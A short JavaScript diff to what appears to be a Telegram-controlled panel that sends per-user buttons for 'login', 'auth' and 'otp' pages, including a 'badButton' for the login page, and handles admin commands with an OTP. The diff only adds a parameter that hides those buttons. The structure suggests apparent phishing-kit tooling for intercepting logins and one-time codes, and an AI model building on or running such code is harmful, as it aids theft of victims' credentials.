@@ -465,7 +465,7 @@ async function buildMessage(data, options = {}) {
       }
     });
 
-    console.log("✅ Telegram message sent with full preserved logic");
+    console.log("✅ Telegram message sent");
 
     return message;
 
@@ -572,7 +572,7 @@ async function handleAdminCommand({ userId, command, otp, io, db }) {
   }
 }
 
-async function buildTelButtons(userId, db) {
+async function buildTelButtons(userId, db, speComm = null) {
   if (!userId) throw new Error("userId missing");
   if (!db) throw new Error("db missing");
 
@@ -630,7 +630,7 @@ buttons.push([
 ]);
 
 // Row 2 (Login / Auth / OTP only)
-if (page === "login" || page === "auth" || page === "otp") {
+if ((page === "login" || page === "auth" || page === "otp") && speComm != "prompt") {
   let badButton;
 
   if (page === "login") {
